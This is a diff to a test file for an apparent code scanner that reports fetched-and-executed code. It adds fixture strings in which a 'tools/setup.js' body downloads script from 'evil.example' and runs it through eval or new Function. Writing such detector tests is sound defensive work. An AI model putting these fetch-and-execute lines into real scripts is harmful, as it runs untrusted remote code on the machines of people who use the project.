@@ -136,6 +136,14 @@ test("fetch APIs the fetched-code rule already names are reported once, by that 
       "tools/setup.js",
       "eval(await (await fetch('https://evil.example/x.js')).text())\n",
     ],
+    [
+      "tools/setup.js",
+      "new Function(await (await fetch('https://evil.example/x.js')).json())()\n",
+    ],
+    [
+      "tools/setup.js",
+      "eval(await (await fetch('https://evil.example/x.js')).arrayBuffer())\n",
+    ],
   ] as const) {
     expect({ path, findings: categories(inspected(path, body)) }).toEqual({
       path,
